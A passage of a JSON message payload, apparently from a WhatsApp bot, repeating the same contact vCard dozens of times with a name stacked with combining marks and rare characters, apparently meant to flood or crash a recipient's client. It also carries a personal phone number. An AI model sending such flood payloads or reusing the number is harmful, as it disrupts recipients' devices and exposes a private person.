								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
